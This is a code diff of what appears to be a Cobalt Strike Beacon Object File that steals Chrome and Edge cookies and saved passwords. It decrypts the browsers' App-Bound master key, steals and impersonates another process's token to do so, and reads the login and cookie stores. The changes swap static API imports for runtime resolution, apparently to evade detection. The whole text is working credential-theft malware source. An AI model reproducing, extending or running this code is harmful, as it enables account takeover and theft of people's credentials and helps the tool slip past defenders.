@@ -1015,13 +1051,18 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     BYTE* output_buffer = NULL;
     DWORD buffer_size = 0;
     SECURITY_STATUS status;
+
+    FARPROC NCryptOpenStorageProvider = Resolver("NCRYPT", "NCryptOpenStorageProvider");
+    FARPROC NCryptOpenKey = Resolver("NCRYPT", "NCryptOpenKey");
+    FARPROC NCryptFreeObject = Resolver("NCRYPT", "NCryptFreeObject");
+    FARPROC NCryptDecrypt = Resolver("NCRYPT", "NCryptDecrypt");
     
     // Initialize output size
     *output_size = 0;
     
     // Open storage provider
     LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
-    status = NCRYPT$NCryptOpenStorageProvider(&hProvider, provider_name, 0);
+    status = NCryptOpenStorageProvider(&hProvider, provider_name, 0);
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenStorageProvider failed with status 0x%08X\n", status);
         return NULL;
@@ -1029,15 +1070,15 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     
     // Open key
     LPCWSTR key_name = L"Google Chromekey1";
-    status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
+    status = NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenKey failed with status 0x%08X\n", status);
-        NCRYPT$NCryptFreeObject(hProvider);
+        NCryptFreeObject(hProvider);
         return NULL;
     }
     
     // First call to get required buffer size
-    status = NCRYPT$NCryptDecrypt(
+    status = NCryptDecrypt(
         hKey,
         (PBYTE)input_data,
         input_size,
@@ -1050,8 +1091,8 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR,"[!] 1st NCryptDecrypt failed with status 0x%08X\n", status);
-        NCRYPT$NCryptFreeObject(hKey);
-        NCRYPT$NCryptFreeObject(hProvider);
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProvider);
         return NULL;
     }
     
@@ -1059,13 +1100,13 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     output_buffer = (BYTE*)MSVCRT$malloc(buffer_size);
     if (!output_buffer) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Memory allocation failed\n");
-        NCRYPT$NCryptFreeObject(hKey);
-        NCRYPT$NCryptFreeObject(hProvider);
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProvider);
         return NULL;
     }
     
     // Second call to actually decrypt
-    status = NCRYPT$NCryptDecrypt(
+    status = NCryptDecrypt(
         hKey,
         (PBYTE)input_data,
         input_size,
@@ -1084,8 +1125,8 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     }
     
     // Clean up
-    NCRYPT$NCryptFreeObject(hKey);
-    NCRYPT$NCryptFreeObject(hProvider);
+    NCryptFreeObject(hKey);
+    NCryptFreeObject(hProvider);
     
     // Set output size
     *output_size = buffer_size;
@@ -1095,6 +1136,11 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
 
 // Steal Token and impersonate user.
 BOOL StealAndImpersonate(int pid) {
+
+    FARPROC OpenProcessToken = Resolver("ADVAPI32", "OpenProcessToken");
+    FARPROC ImpersonateLoggedOnUser = Resolver("ADVAPI32", "ImpersonateLoggedOnUser");
+    FARPROC DuplicateTokenEx = Resolver("ADVAPI32", "DuplicateTokenEx");
+
     HANDLE hProcess, hToken, hUser;
     hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (hProcess == NULL) {
@@ -1102,20 +1148,20 @@ BOOL StealAndImpersonate(int pid) {
         return FALSE;
     }
 
-    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hProcess);
         return FALSE;
     }
 
-    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
+    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hToken);
         KERNEL32$CloseHandle(hProcess);
         return FALSE;
     }
 
-    if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
+    if (!ImpersonateLoggedOnUser(hUser)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hToken);
         KERNEL32$CloseHandle(hProcess);
@@ -1128,6 +1174,12 @@ BOOL StealAndImpersonate(int pid) {
 
 BOOL AppBoundDecryptor(char * localStateFile, int pid){
     //IMPORT_RESOLVE;
+
+    FARPROC RevertToSelf = Resolver("ADVAPI32", "RevertToSelf");
+
+    FARPROC OpenProcessToken = Resolver("ADVAPI32", "OpenProcessToken");
+    FARPROC DuplicateTokenEx = Resolver("ADVAPI32", "DuplicateTokenEx");
+    FARPROC ImpersonateLoggedOnUser = Resolver("ADVAPI32", "ImpersonateLoggedOnUser");
 
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
     // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
@@ -1151,7 +1203,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
         // Decrypt V10 Encryption Key
         if (StealAndImpersonate(pid)) {
             GetMasterKey(v10_key);
-            ADVAPI32$RevertToSelf();
+            RevertToSelf();
             BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
         } else {
             results_master_key = FALSE;
@@ -1224,7 +1276,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
                 goto cleanup_early;
             }
             
-            if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+            if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
                 BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
                 KERNEL32$CloseHandle(hProcess);
                 MSVCRT$free(encrypted_key);
@@ -1232,7 +1284,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
                 goto cleanup_early;
             }
             
-            if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
+            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
                 BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
                 KERNEL32$CloseHandle(hToken);
                 KERNEL32$CloseHandle(hProcess);
@@ -1241,7 +1293,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
                 goto cleanup_early;
             }
             
-            if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
+            if (!ImpersonateLoggedOnUser(hUser)) {
                 BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
                 KERNEL32$CloseHandle(hToken);
                 KERNEL32$CloseHandle(hProcess);
@@ -1257,7 +1309,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
             if (!result) {
                 BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
-                ADVAPI32$RevertToSelf();
+                RevertToSelf();
                 KERNEL32$CloseHandle(hToken);
                 KERNEL32$CloseHandle(hProcess);
                 KERNEL32$CloseHandle(hUser);
@@ -1276,7 +1328,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
 
         // Revert impersonation
         if (hUser != NULL) {
-            ADVAPI32$RevertToSelf();
+            RevertToSelf();
             KERNEL32$CloseHandle(hToken);
             KERNEL32$CloseHandle(hProcess);
             KERNEL32$CloseHandle(hUser);
@@ -1398,10 +1450,11 @@ BOOL isBrowserSupported(char* browser) {
 }
 
 BOOL ConstructDbPath(char* dest, size_t dest_size, const char* browser, const char* type) {
+    FARPROC _snprintf = Resolver("MSVCRT", "_snprintf");
     if (!dest || !browser || !type || dest_size < 1) {
         return FALSE;
     }
-    int result = MSVCRT$_snprintf(dest, dest_size, "%s%s.db", browser, type);
+    int result = _snprintf(dest, dest_size, "%s%s.db", browser, type);
     if (result < 0 || (size_t)result >= dest_size) {
         dest[dest_size - 1] = '\0';
         return FALSE;
@@ -1443,6 +1496,8 @@ VOID go(char *buf, int len) {
     cookieOnly = BeaconDataInt(&parser);
     loginDataOnly = BeaconDataInt(&parser);
     copyFile = BeaconDataExtract(&parser, NULL);
+
+    FARPROC StrStrIA = Resolver("SHLWAPI", "StrStrIA");
 
     BOOL status = FALSE;
 
@@ -1486,11 +1541,11 @@ VOID go(char *buf, int len) {
         }
         //if cookie or login data only, then get the cookies and/or passwords and exit
         if (cookieOnly == 1 || loginDataOnly == 1){
-            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
+            if (StrStrIA(localStateFile, "chrome") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
                 GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             }
-            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
+            if (StrStrIA(localStateFile, "edge") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
                 GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
             }
@@ -1498,11 +1553,11 @@ VOID go(char *buf, int len) {
         }
         
         if(AppBoundDecryptor(localStateFile, pid)){
-            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
+            if (StrStrIA(localStateFile, "chrome") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
                 GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             }
-            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
+            if (StrStrIA(localStateFile, "edge") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
                 GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
             }
